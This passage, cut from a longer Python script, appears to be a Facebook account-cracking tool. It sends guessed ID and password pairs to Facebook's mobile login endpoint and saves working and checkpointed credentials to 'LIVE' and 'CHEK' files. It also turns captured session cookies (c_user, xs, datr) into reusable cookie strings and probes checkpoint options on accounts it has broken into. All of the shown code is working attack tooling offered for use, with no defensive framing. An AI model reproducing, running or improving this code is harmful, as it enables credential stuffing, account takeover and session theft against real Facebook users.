			'referer': f'https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=773377663248035&kid_directed_site=0&app_id=773377663248035&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D773377663248035%26cbt%3D1701103005780%26e2e%3D%257B%2522init%2522%253A1701103005780%257D%26ies%3D1%26sdk%3Dandroid-16.0.1%26sso%3Dchrome_custom_tab%26nonce%3D19dee792-24b0-4851-86d5-1e0ee92f8abe%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%26state%3D%257B%25220_auth_logger_id%2522%253A%25221ed24841-c76a-42ee-8d09-11a541bf8e60%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522dt3rl7b67b45jbh6o98d%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb773377663248035%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DKa0VU2yhKDMrCXYrCvpIvisKhFC8rIFLLYaGn6InqEk%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1ed24841-c76a-42ee-8d09-11a541bf8e60%26tp%3Dunspecified&cancel_url=fb773377663248035%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25221ed24841-c76a-42ee-8d09-11a541bf8e60%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522dt3rl7b67b45jbh6o98d%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			}
			po = ses.post("https://m.prod.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data,headers=hider,allow_redirects=False)
			response=parser(po.text, "html.parser")
			if "checkpoint" in po.cookies.get_dict():
				cp+=1
				open('CHEK/'+cph,'a').write(f'{idf}|{pw}\n') 
				tree = Tree("                                 ")
				tree.add(f"\r{kun}{idf} {pw}{xxx}")
				tree.add(f"\r{mer}{ua}")
				prints(tree)
				break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				ok+=1
				open('LIVE/'+okh,'a').write(f'{idf}|{pw}\n') 
				tree = Tree("                                 ")
				tree.add(f"⌲ ID : {hijo}{idf}{puti}")
				tree.add(f"⌲ Password: {hijo}{pw}{puti}")
				tree.add(f"⌲ Tahun Account: {mer}{tahun(idf)}{puti}")
				tree.add(f"⌲ CokiCoki: {biru}{kuki}{puti}")
				tree.add(f"⌲ {mer}{ua}")
				prints(tree)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
	
def ceker(idf,pw):
	sess=requests.Session()
	data={}
	data2={}
	uua="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
	sess.headers.update({"User-Agent":uua,"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://m.facebook.com/","user-agent":"ua"})
	soup=parse(sess.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):data.update({x.get("name"):x.get("value")})
	data.update({"email":idf,"pass":pw})
	response=parse(sess.post("https://m.facebook.com"+link.get("action"),data=data).text,"html.parser")
	try:
		link2=response.find("form",{"method":"post"});listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:data2.update({x.get("name"):x.get("value")}) 
		responses=parse(sess.post("https://m.facebook.com"+link2.get("action"),data=data2).text,"html.parser")
		cek=[cek.text for cek in responses.find_all("option")]
		if len(cek)==0:pass
		else:
			for opsi in range(len(cek)):ops.append(print(f" {xxx}{cek[opsi]}"))
	except:pass
	if len(ops)==0:pass
	print (' [+] Columns(ops)')
		
				


###---[ CONVERT COOKIE ]---###
def convert(cookie):
 cok = ('datr=%s;sb=%s;c_user=%s;xs=%s;fr=%s'%(cookie['datr'],cookie['sb'],cookie['c_user'],cookie['xs'],cookie['fr']))
 return(str(cok))
###----------#[ CREAT FILE ]#----------###
# -----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__ == '__main__':
    try:
        os.system('git pull')
    except:
        pass
    try:
        os.mkdir('OK')
    except:
        pass
    try:
        os.mkdir('CP')
    except:
        pass
    try:
        os.mkdir('DUMP')
    except:
        pass
    try:
        os.system('touch .prox.txt')
    except:
        pass
    login()
